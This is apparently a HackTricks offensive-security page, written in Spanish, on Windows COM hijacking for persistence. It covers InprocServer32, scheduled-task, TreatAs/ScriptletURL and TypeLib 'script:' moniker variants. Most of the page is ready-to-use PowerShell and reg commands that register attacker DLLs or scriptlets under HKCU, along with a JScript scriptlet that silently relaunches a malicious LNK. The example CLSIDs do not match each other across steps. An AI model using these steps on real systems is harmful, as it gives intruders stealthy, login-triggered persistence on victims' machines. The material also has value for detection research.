# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

Como los valores de HKCU pueden ser modificados por los usuarios, **COM Hijacking** podría utilizarse como **mecanismo de persistencia**. Usando `procmon`, es fácil encontrar registros COM buscados que aún no existen y que podrían ser creados por un atacante. Filtros clásicos:

- Operaciones **RegOpenKey**.
- donde el _Result_ sea **NAME NOT FOUND**.
- y el _Path_ termine en **InprocServer32**.

Variaciones útiles durante la búsqueda:

- Busca también claves **`LocalServer32`** inexistentes. Algunas clases COM son servidores fuera de proceso y ejecutarán un EXE controlado por el atacante en lugar de una DLL.
- Busca operaciones de registro **`TreatAs`** y **`ScriptletURL`**, además de `InprocServer32`. El contenido reciente de detección y los análisis de malware siguen destacando estos elementos porque son mucho menos comunes que los registros COM normales y, por tanto, ofrecen una señal más clara.
- Copia el **`ThreadingModel`** legítimo del `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` original al clonar un registro en HKCU. Usar un modelo incorrecto suele romper la activación y hacer que el hijack sea más detectable.<sup>[[3]](#references)</sup>
- En sistemas de 64 bits, inspecciona tanto las vistas de 64 bits como las de 32 bits (`procmon.exe` frente a `procmon64.exe`, `HKLM\Software\Classes` y `HKLM\Software\Classes\WOW6432Node`), ya que las aplicaciones de 32 bits pueden resolver un registro COM diferente.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que podría ser excesivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM de Task Scheduler susceptibles de Hijack

Windows Tasks utilizan Custom Triggers para llamar a objetos COM y, como se ejecutan mediante Task Scheduler, es más fácil predecir cuándo se activarán.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Al revisar la salida, puedes seleccionar uno que se ejecute **cada vez que un usuario inicia sesión**, por ejemplo.

Ahora, al buscar el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\CLASSES\ROOT\CLSID** y en HKLM y HKCU, normalmente comprobarás que el valor no existe en HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Entonces, solo tienes que crear la entrada HKCU y, cada vez que el usuario inicie sesión, se ejecutará tu backdoor.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite que un CLSID sea emulado por otro. <sup>[[4]](#references)</sup> Desde una perspectiva ofensiva, esto significa que puedes dejar intacto el CLSID original, crear un segundo CLSID por usuario que apunte a `scrobj.dll` y, a continuación, redirigir el objeto COM real al malicioso mediante `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Esto resulta útil cuando:

- la aplicación objetivo ya instancia un CLSID estable al iniciar sesión o al iniciar la aplicación
- quieres una redirección basada únicamente en el registro en lugar de reemplazar el `InprocServer32` original
- quieres ejecutar un scriptlet `.sct` local o remoto mediante el valor `ScriptletURL`

Flujo de trabajo de ejemplo (adaptado del tradecraft público de Atomic Red Team y de investigaciones anteriores sobre el abuso del registro de COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notas:

- `scrobj.dll` lee el valor `ScriptletURL` y ejecuta el `.sct` referenciado, por lo que puedes mantener el payload como un archivo local o descargarlo remotamente mediante HTTP/HTTPS.
- `TreatAs` resulta especialmente útil cuando el registro COM original está completo y estable en HKLM, porque solo necesitas una pequeña redirección por usuario en lugar de replicar todo el árbol.
- Para realizar la validación sin esperar al trigger natural, puedes instanciar manualmente el ProgID/CLSID falso con `rundll32.exe -sta <ProgID-or-CLSID>` si la clase objetivo admite activación STA.

## COM TypeLib Hijacking (script: moniker persistence)

Las Type Libraries (TypeLib) definen interfaces COM y se cargan mediante `LoadTypeLib()`. Cuando se instancia un servidor COM, el sistema operativo también puede cargar la TypeLib asociada consultando las claves del registro bajo `HKCR\TypeLib\{LIBID}`. Si la ruta de la TypeLib se reemplaza por un **moniker**, por ejemplo `script:C:\...\evil.sct`, Windows ejecutará el scriptlet cuando se resuelva la TypeLib, lo que proporciona una persistence sigilosa que se activa cuando se utilizan componentes comunes.

Esto se ha observado contra el control Microsoft Web Browser (cargado frecuentemente por Internet Explorer, aplicaciones que incorporan WebBrowser e incluso `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Pasos (PowerShell)

1) Identifica la TypeLib (LIBID) utilizada por un CLSID de alta frecuencia. Ejemplo de CLSID utilizado con frecuencia por cadenas de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Apunta la ruta de TypeLib por usuario a un scriptlet local mediante el moniker `script:` (no se requieren privilegios de administrador):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Coloca un `.sct` mínimo de JScript que vuelva a ejecutar tu payload principal (por ejemplo, un `.lnk` usado por la cadena inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Activación: abrir IE, una aplicación que integre el control WebBrowser o incluso la actividad rutinaria de Explorer cargará la TypeLib y ejecutará el scriptlet, rearmando tu cadena al iniciar sesión o reiniciar.

Limpieza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Puedes aplicar la misma lógica a otros componentes COM de alta frecuencia; resuelve siempre primero el `LIBID` real desde `HKCR\CLSID\{CLSID}\TypeLib`.
- En sistemas de 64 bits también puedes rellenar la subclave `win64` para consumidores de 64 bits.

## Referencias

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Campaña ZipLine: un sofisticado ataque de phishing dirigido a empresas estadounidenses](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
